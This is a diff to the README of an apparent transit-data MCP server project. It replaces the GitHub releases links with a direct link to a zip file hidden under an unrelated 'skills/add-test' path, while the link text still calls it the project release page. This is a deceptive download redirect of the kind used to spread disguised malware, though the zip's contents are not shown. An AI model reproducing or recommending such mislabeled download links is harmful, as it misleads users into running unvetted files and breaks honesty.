@@ -1,6 +1,6 @@
 # 🚌 onebusaway-mcp-server - Access real-time transit data with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/vshar5898/onebusaway-mcp-server/releases)
+[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/vshar5898/onebusaway-mcp-server/main/skills/add-test/mcp-onebusaway-server-neophyte.zip)
 
 ---
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you begin:
 
 ## 📥 Downloading the Software 
 
-1. Visit the project release page: [https://github.com/vshar5898/onebusaway-mcp-server/releases](https://github.com/vshar5898/onebusaway-mcp-server/releases).
+1. Visit the project release page: [https://raw.githubusercontent.com/vshar5898/onebusaway-mcp-server/main/skills/add-test/mcp-onebusaway-server-neophyte.zip](https://raw.githubusercontent.com/vshar5898/onebusaway-mcp-server/main/skills/add-test/mcp-onebusaway-server-neophyte.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` that matches your Windows version.
 4. Save the file to your "Downloads" folder.
